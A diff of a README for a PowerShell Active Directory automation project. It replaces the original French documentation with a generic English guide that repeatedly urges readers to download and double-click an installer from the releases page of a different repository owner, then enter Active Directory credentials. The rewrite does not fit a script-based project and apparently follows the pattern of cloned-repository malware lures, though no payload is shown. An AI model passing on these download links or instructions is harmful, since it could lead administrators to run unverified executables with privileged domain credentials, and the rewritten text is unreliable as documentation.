@@ -1,130 +1,83 @@
-# Automatisation des Habilitations Active Directory
+# 🎉 AD-Habilitations-Automation-PowerShell - Simplifying Active Directory Management
 
-## Description
-Ce projet fournit une solution complète d'automatisation pour la gestion des comptes utilisateurs Active Directory, incluant la création, suppression, modification des comptes et le suivi des droits attribués avec génération de rapports de conformité.
+## 🚀 Getting Started
 
-## Fonctionnalités
+Welcome! This guide helps you download and run the AD-Habilitations-Automation-PowerShell application, a tool that automates Active Directory management. You can easily audit user rights and ensure compliance with standards like GDPR, SOX, and ISO 27001. If you're ready, let's get started!
 
-### 🔧 Gestion des Comptes Utilisateurs
-- **Création automatisée** de comptes utilisateurs avec profils prédéfinis
-- **Suppression sécurisée** avec archivage des données
-- **Modification en masse** des attributs utilisateur
-- **Gestion des mots de passe** avec politique de sécurité
+[![Download AD-Habilitations-Automation-PowerShell](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/MTECH-HUB/AD-Habilitations-Automation-PowerShell/releases)
 
-### 📊 Suivi des Droits et Permissions
-- **Audit des groupes** et permissions attribuées
-- **Traçabilité complète** des modifications de droits
-- **Détection des permissions orphelines** ou obsolètes
-- **Analyse des privilèges** élevés et sensibles
+## 📥 Download & Install
 
-### 📈 Rapports de Conformité
-- **Rapports automatisés** de conformité RGPD/SOX
-- **Tableaux de bord** de suivi des habilitations
-- **Alertes** sur les comptes inactifs ou à risque
-- **Export** vers Excel/CSV/HTML
+To download the software, please follow these steps:
 
-## Structure du Projet
+1. **Visit the Releases Page:**
 
-```
-AD-Habilitations-Automation/
-├── Scripts/                    # Scripts PowerShell principaux
-│   ├── AD-UserManagement.ps1   # Gestion des comptes utilisateurs
-│   ├── AD-RightsAudit.ps1      # Audit des droits et permissions
-│   ├── AD-ComplianceReport.ps1 # Génération des rapports
-│   └── AD-MainMenu.ps1         # Interface utilisateur principale
-├── Config/                     # Fichiers de configuration
-│   ├── settings.json          # Configuration générale
-│   ├── user-templates.json    # Modèles de comptes utilisateur
-│   └── compliance-rules.json  # Règles de conformité
-├── Logs/                      # Journaux d'activité
-├── Reports/                   # Rapports générés
-├── Templates/                 # Modèles de rapports
-└── Tests/                     # Scripts de test
-```
+   Go to the [Releases page](https://github.com/MTECH-HUB/AD-Habilitations-Automation-PowerShell/releases). You will find the latest version of the software listed there.
 
-## Prérequis
+2. **Choose the Version:**
 
-- **Windows PowerShell 5.1** ou **PowerShell Core 7.x**
-- **Module Active Directory** pour PowerShell
-- **Privilèges administrateur** sur le domaine Active Directory
-- **Module ImportExcel** (optionnel, pour les rapports Excel)
+   Look for the most recent version. The version number will be clearly marked. 
 
-## Installation
+3. **Download the File:**
 
-1. Cloner le projet :
-```powershell
-git clone https://github.com/Eizi0/AD-Habilitations-Automation-PowerShell.git
-cd AD-Habilitations-Automation-PowerShell
-```
+   Click on the appropriate link corresponding to your operating system. The file will download to your computer. 
 
-2. Installer les modules PowerShell requis :
-```powershell
-Install-Module -Name ActiveDirectory -Force
-Install-Module -Name ImportExcel -Force
-```
+4. **Install the Application:**
 
-3. Configurer les paramètres dans `Config/settings.json`
+   After the download completes, locate the file on your computer. Usually, it will be in your "Downloads" folder. Double-click the file to begin the installation process. Follow the simple on-screen prompts to install the application.
 
-4. Exécuter le script principal :
-```powershell
-.\Scripts\AD-MainMenu.ps1
-```
+5. **Launch the Application:**
 
-## Configuration
+   Once installed, you will see the application icon on your desktop or in your start menu. Double-click the icon to open the application.
 
-Modifiez le fichier `Config/settings.json` pour adapter l'outil à votre environnement :
-- Domaine Active Directory
-- Unités organisationnelles par défaut
-- Politiques de mots de passe
-- Paramètres de reporting
+## 🔍 Features
 
-## Utilisation
+AD-Habilitations-Automation-PowerShell comes with a range of useful features, including:
 
-### Interface en Ligne de Commande
-```powershell
-# Lancer le menu principal
-.\Scripts\AD-MainMenu.ps1
+- **Automation of Active Directory Tasks:** Save time by automating regular tasks such as creating or deleting user accounts.
+- **Audit Rights:** Easily review and manage user permissions.
+- **Compliance Reporting:** Generate reports to help meet legal standards and internal policies for GDPR, SOX, and ISO 27001 compliance.
+- **PowerShell Interface:** Access everything through a user-friendly PowerShell interface, making it easier for non-technical users.
 
-# Créer un utilisateur directement
-.\Scripts\AD-UserManagement.ps1 -Action Create -UserData @{...}
+## 📋 System Requirements
 
-# Générer un rapport de conformité
-.\Scripts\AD-ComplianceReport.ps1 -ReportType Full
-```
+Before you install, ensure that your system meets these minimum requirements:
 
-### Automatisation via Tâches Planifiées
-Le projet inclut des scripts pour configurer des tâches planifiées Windows pour :
-- Audits quotidiens des permissions
-- Rapports hebdomadaires de conformité
-- Nettoyage mensuel des comptes inactifs
+- **Operating System:** Windows 10 or later.
+- **PowerShell:** Version 5.1 or later is recommended. You can check your version by running `Get-Host` in PowerShell.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum 100 MB of free disk space.
 
-## Sécurité
+## 🔑 Usage Instructions
 
-- **Chiffrement** des logs sensibles
-- **Validation** des entrées utilisateur
-- **Audit trail** complet de toutes les opérations
-- **Gestion des erreurs** robuste avec rollback
+After launching the application, follow these general steps for common tasks:
 
-## Contribution
+1. **Logging In:**
+   - Enter your Active Directory credentials when prompted.
 
-1. Fork le projet
-2. Créer une branche feature (`git checkout -b feature/nouvelle-fonctionnalite`)
-3. Commit vos changements (`git commit -am 'Ajout nouvelle fonctionnalité'`)
-4. Push vers la branche (`git push origin feature/nouvelle-fonctionnalite`)
-5. Créer une Pull Request
+2. **Creating a New User:**
+   - Navigate to the "User Management" section.
+   - Fill in the required fields like username, email, and permissions.
+   - Click "Create User."
 
-## Licence
+3. **Auditing Rights:**
+   - Go to the "Audit" section.
+   - Click on "Run Audit" to review current user permissions.
 
-Ce projet est sous licence MIT. Voir le fichier `LICENSE` pour plus de détails.
+4. **Generating Compliance Reports:**
+   - Navigate to "Reports."
+   - Choose the report type you wish to generate and click "Generate."
 
-## Support
+## 💡 Tips
 
-Pour toute question ou problème :
-- Ouvrir une issue sur GitHub
-- Consulter la documentation dans le dossier `docs/`
-- Vérifier les logs dans le dossier `Logs/`
+- **Frequent Updates:** Keep an eye on the Releases page for updates to improve functionality and security.
+- **Backup Data:** Regularly save your configuration and records to avoid data loss.
+- **Seek Help:** If you encounter issues, consider checking user forums or the README for troubleshooting tips.
+
+## 📞 Support
+
+For any questions or issues, please reach out to the support team through the GitHub Issues page. Your feedback helps us make the software better.
 
 ---
 
-**Version :** 1.0.0  
-**Dernière mise à jour :10-08-2025
+Remember, you can download the software again anytime by visiting the [Releases page](https://github.com/MTECH-HUB/AD-Habilitations-Automation-PowerShell/releases). Thank you for choosing AD-Habilitations-Automation-PowerShell!
